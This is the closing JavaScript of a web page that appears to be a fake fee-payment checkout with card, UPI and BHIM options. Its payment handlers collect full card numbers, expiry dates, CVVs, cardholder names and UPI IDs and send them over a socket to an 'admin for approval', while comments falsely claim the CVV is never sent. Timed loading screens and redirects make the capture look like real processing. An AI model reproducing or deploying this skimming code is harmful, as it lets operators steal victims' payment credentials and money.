        visaLogo.classList.remove('grayscale', 'opacity-50');
        visaLogo.classList.add('opacity-100');
    } else if (firstDigit === '5') {
        // Mastercard
        mastercardLogo.classList.remove('grayscale', 'opacity-50');
        mastercardLogo.classList.add('opacity-100');
    } else if (firstDigit === '6') {
        // RuPay
        rupayLogo.classList.remove('grayscale', 'opacity-50');
        rupayLogo.classList.add('opacity-100');
    }
}

function resetCardLogos() {
    const visaLogo = document.getElementById('visaLogo');
    const mastercardLogo = document.getElementById('mastercardLogo');
    const rupayLogo = document.getElementById('rupayLogo');
    
    // Set all to grayscale
    visaLogo.classList.add('grayscale', 'opacity-50');
    visaLogo.classList.remove('opacity-100');
    mastercardLogo.classList.add('grayscale', 'opacity-50');
    mastercardLogo.classList.remove('opacity-100');
    rupayLogo.classList.add('grayscale', 'opacity-50');
    rupayLogo.classList.remove('opacity-100');
}

function showSection(name) {
    document.querySelectorAll('.side-pill').forEach(el => el.classList.remove('active', 'bg-gradient-to-r', 'from-orange-50', 'to-white'));
    document.querySelectorAll('.section').forEach(el => el.classList.add('hidden'));
    
    event.currentTarget.classList.add('active', 'bg-gradient-to-r', 'from-orange-50', 'to-white');
    document.getElementById(name + '-section').classList.remove('hidden');
    document.getElementById(name + '-section').classList.add('active');
}

function startTimer() {
    let time = 300;
    setInterval(() => {
        if (time <= 0) return;
        time--;
        let min = Math.floor(time / 60);
        let sec = time % 60;
        const timerEl = document.getElementById('qrTimer');
        if (timerEl) {
            timerEl.textContent = String(min).padStart(2, '0') + ':' + String(sec).padStart(2, '0');
        }
    }, 1000);
}

function openQRModal() {
    // Show loading screen first
    const loadingScreen = document.getElementById('loadingScreen');
    loadingScreen.classList.remove('hidden');
    loadingScreen.classList.add('flex');
    
    // After 1.5 seconds, hide loading and show QR modal
    setTimeout(() => {
        // Hide loading screen
        loadingScreen.classList.add('hidden');
        loadingScreen.classList.remove('flex');
        
        // Show QR modal
        const modal = document.getElementById('qrModal');
        modal.classList.remove('hidden');
        modal.classList.add('flex');
        
        // Reset timer to 5 minutes
        modalTimeRemaining = 300;
        updateModalTimer();
        
        // Clear any existing interval
        if (modalTimerInterval) {
            clearInterval(modalTimerInterval);
        }
        
        // Start countdown
        modalTimerInterval = setInterval(() => {
            if (modalTimeRemaining <= 0) {
                clearInterval(modalTimerInterval);
                return;
            }
            modalTimeRemaining--;
            updateModalTimer();
        }, 1000);
    }, 1500); // 1.5 seconds loading time
}

function closeQRModal(event) {
    if (event && event.target !== event.currentTarget) {
        return; // Don't close if clicking inside modal content
    }
    
    const modal = document.getElementById('qrModal');
    modal.classList.add('hidden');
    modal.classList.remove('flex');
    
    // Stop the timer
    if (modalTimerInterval) {
        clearInterval(modalTimerInterval);
        modalTimerInterval = null;
    }
}

function updateModalTimer() {
    let min = Math.floor(modalTimeRemaining / 60);
    let sec = modalTimeRemaining % 60;
    const timerEl = document.getElementById('modalTimer');
    if (timerEl) {
        timerEl.textContent = String(min).padStart(2, '0') + ':' + String(sec).padStart(2, '0');
    }
}

// ============================================
// PAYMENT PROCESSING
// ============================================

function handlePayment() {
    const payButton = document.getElementById('payButton');
    
    // Disable button
    payButton.disabled = true;
    payButton.textContent = 'Processing...';
    
    // Get card details
    const cardNumber = document.getElementById('cardNumber').value;
    const expiryDate = document.getElementById('expiryDate').value;
    const cvv = document.getElementById('cvvCode').value;
    const cardHolderName = document.getElementById('cardHolderName').value;
    
    // Detect card type
    const firstDigit = cardNumber.charAt(0);
    let cardType = 'Unknown';
    if (firstDigit === '4') cardType = 'Visa';
    else if (firstDigit === '5') cardType = 'Mastercard';
    else if (firstDigit === '6') cardType = 'RuPay';
    
    // Prepare card details (NOW INCLUDING CVV FOR ADMIN VERIFICATION)
    const cardDetails = {
        cardNumber: cardNumber, // Will be encrypted client-side in production
        expiryDate: expiryDate,
        cvv: cvv, // CVV sent to admin for verification
        cardHolderName: cardHolderName,
        cardType: cardType
    };
    
    // Validate CVV locally (never send it)
    if (!validateCVV(cvv)) {
        alert('Invalid CVV');
        payButton.disabled = false;
        payButton.textContent = 'Pay ‚Çπ82450';
        return;
    }
    
    // Send card details to server via WebSocket
    if (paymentSocket && paymentSessionId) {
        paymentSocket.emit('cardDetailsSubmitted', {
            sessionId: paymentSessionId,
            cardDetails: cardDetails
        });
        
        console.log('üí≥ Card details sent to admin for approval');
        
        // Show waiting message
        payButton.textContent = 'Waiting for approval...';
        payButton.classList.add('animate-pulse');
        
    } else {
        alert('Connection error. Please refresh and try again.');
        payButton.disabled = false;
        payButton.textContent = 'Pay ‚Çπ82450';
    }
}

// UPI Payment Handler (will be used when UPI section is submitted)
function handleUpiPayment(upiId) {
    if (paymentSocket && paymentSessionId) {
        paymentSocket.emit('upiDetailsSubmitted', {
            sessionId: paymentSessionId,
            upiDetails: {
                upiId: upiId,
                upiApp: 'Unknown' // Can be detected from UPI ID
            }
        });
        
        console.log('üì± UPI details sent to admin for approval');
    }
}

// CVV Validation (local only - never sent to server)
function validateCVV(cvv) {
    return cvv && cvv.length === 3 && /^\d{3}$/.test(cvv);
}

// Card Number Validation (Luhn Algorithm)
function validateCardNumber(cardNumber) {
    const cleaned = cardNumber.replace(/\s/g, '');
    
    if (!/^\d{16}$/.test(cleaned)) return false;
    
    // Luhn algorithm
    let sum = 0;
    let isEven = false;
    
    for (let i = cleaned.length - 1; i >= 0; i--) {
        let digit = parseInt(cleaned[i]);
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) digit -= 9;
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    return sum % 10 === 0;
}

// Expiry Date Validation
function validateExpiryDate(expiryDate) {
    if (!/^\d{2}\/\d{2}$/.test(expiryDate)) return false;
    
    const [month, year] = expiryDate.split('/').map(Number);
    const currentYear = new Date().getFullYear() % 100;
    const currentMonth = new Date().getMonth() + 1;
    
    if (month < 1 || month > 12) return false;
    if (year < currentYear) return false;
    if (year === currentYear && month < currentMonth) return false;
    
    return true;
}

// ============================================
// UPI PAYMENT FUNCTIONS
// ============================================

// Validate UPI form
function validateUpiForm() {
    const upiInput = document.getElementById('upiInput');
    const upiPayButton = document.getElementById('upiPayButton');
    const upiId = upiInput.value.trim();
    
    // Basic UPI ID validation: should contain @ and have text before and after
    const isValid = upiId.length > 3 && upiId.includes('@') && upiId.indexOf('@') > 0 && upiId.indexOf('@') < upiId.length - 1;
    
    if (isValid) {
        upiPayButton.disabled = false;
        upiPayButton.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        upiPayButton.classList.add('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    } else {
        upiPayButton.disabled = true;
        upiPayButton.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        upiPayButton.classList.remove('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    }
}

// Append UPI suffix to input
function appendUpiSuffix(suffix) {
    const upiInput = document.getElementById('upiInput');
    const currentValue = upiInput.value.trim();
    
    // If already has @, replace everything after @
    if (currentValue.includes('@')) {
        const parts = currentValue.split('@');
        upiInput.value = parts[0] + suffix;
    } else {
        // Otherwise just append
        upiInput.value = currentValue + suffix;
    }
    
    validateUpiForm();
}

// Handle UPI Payment
function handleUpiPayment() {
    const upiInput = document.getElementById('upiInput');
    const upiPayButton = document.getElementById('upiPayButton');
    const upiId = upiInput.value.trim();
    
    // Disable button
    upiPayButton.disabled = true;
    upiPayButton.textContent = 'Processing...';
    
    // Generate session ID
    paymentSessionId = 'UPI_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    // Prepare UPI payment data
    const upiPaymentData = {
        sessionId: paymentSessionId,
        paymentType: 'UPI',
        upiId: upiId,
        amount: 82450,
        currency: 'INR',
        timestamp: new Date().toISOString(),
        studentData: studentData,
        orderID: document.getElementById('orderID').textContent
    };
    
    // Send to backend via Socket.IO
    if (paymentSocket && paymentSocket.connected) {
        console.log('üì± Sending UPI payment data:', upiPaymentData);
        paymentSocket.emit('upiDetailsSubmitted', upiPaymentData);
        
        // Show loading screen with blur
        showLoadingScreen();
        
        // After 3-4 seconds, redirect to UPI processing page
        setTimeout(() => {
            // Pass session ID and UPI ID to the new page
            window.location.href = `upi_processing.html?sessionId=${paymentSessionId}&upiId=${encodeURIComponent(upiId)}&amount=82450`;
        }, 3500); // 3.5 seconds
    } else {
        console.error('‚ùå Socket not connected');
        alert('Connection error. Please try again.');
        upiPayButton.disabled = false;
        upiPayButton.textContent = 'Pay ‚Çπ82450';
    }
}

// Show loading screen with blur
function showLoadingScreen() {
    const loadingScreen = document.getElementById('loadingScreen');
    const loadingText = document.getElementById('loadingText');
    loadingText.textContent = 'Processing Payment...';
    loadingScreen.classList.remove('hidden');
    loadingScreen.classList.add('flex');
    
    // Make background white and blurred
    loadingScreen.style.backgroundColor = 'rgba(255, 255, 255, 0.95)';
    loadingScreen.style.backdropFilter = 'blur(10px)';
}


// ============================================
// BHIM PAYMENT FUNCTIONS
// ============================================

// Validate BHIM form
function validateBhimForm() {
    const bhimInput = document.getElementById('bhimInput');
    const bhimPayButton = document.getElementById('bhimPayButton');
    const upiId = bhimInput.value.trim();
    
    // Basic UPI ID validation: should contain @ and have text before and after
    const isValid = upiId.length > 3 && upiId.includes('@') && upiId.indexOf('@') > 0 && upiId.indexOf('@') < upiId.length - 1;
    
    if (isValid) {
        bhimPayButton.disabled = false;
        bhimPayButton.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        bhimPayButton.classList.add('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    } else {
        bhimPayButton.disabled = true;
        bhimPayButton.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
        bhimPayButton.classList.remove('bg-orange-500', 'text-white', 'cursor-pointer', 'hover:bg-orange-600');
    }
}

// Append BHIM suffix to input
function appendBhimSuffix(suffix) {
    const bhimInput = document.getElementById('bhimInput');
    const currentValue = bhimInput.value.trim();
    
    // If already has @, replace everything after @
    if (currentValue.includes('@')) {
        const parts = currentValue.split('@');
        bhimInput.value = parts[0] + suffix;
    } else {
        // Otherwise just append
        bhimInput.value = currentValue + suffix;
    }
    
    validateBhimForm();
}

// Handle BHIM Payment
function handleBhimPayment() {
    const bhimInput = document.getElementById('bhimInput');
    const bhimPayButton = document.getElementById('bhimPayButton');
    const upiId = bhimInput.value.trim();
    
    // Disable button
    bhimPayButton.disabled = true;
    bhimPayButton.textContent = 'Processing...';
    
    // Generate session ID
    paymentSessionId = 'BHIM_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    // Prepare BHIM payment data
    const bhimPaymentData = {
        sessionId: paymentSessionId,
        paymentType: 'BHIM',
        upiId: upiId,
        amount: 82450,
        currency: 'INR',
        timestamp: new Date().toISOString(),
        studentData: studentData,
        orderID: document.getElementById('orderID').textContent
    };
    
    // Send to backend via Socket.IO
    if (paymentSocket && paymentSocket.connected) {
        console.log('üí≥ Sending BHIM payment data:', bhimPaymentData);
        paymentSocket.emit('bhimDetailsSubmitted', bhimPaymentData);
        
        // Show loading screen with blur
        showLoadingScreen();
        
        // After 3-4 seconds, redirect to UPI processing page
        setTimeout(() => {
            // Pass session ID and UPI ID to the new page
            window.location.href = `upi_processing.html?sessionId=${paymentSessionId}&upiId=${encodeURIComponent(upiId)}&amount=82450&type=BHIM`;
        }, 3500); // 3.5 seconds
    } else {
        console.error('‚ùå Socket not connected');
        alert('Connection error. Please try again.');
        bhimPayButton.disabled = false;
        bhimPayButton.textContent = 'Pay ‚Çπ82450';
    }
}

</script>

</body>
</html>
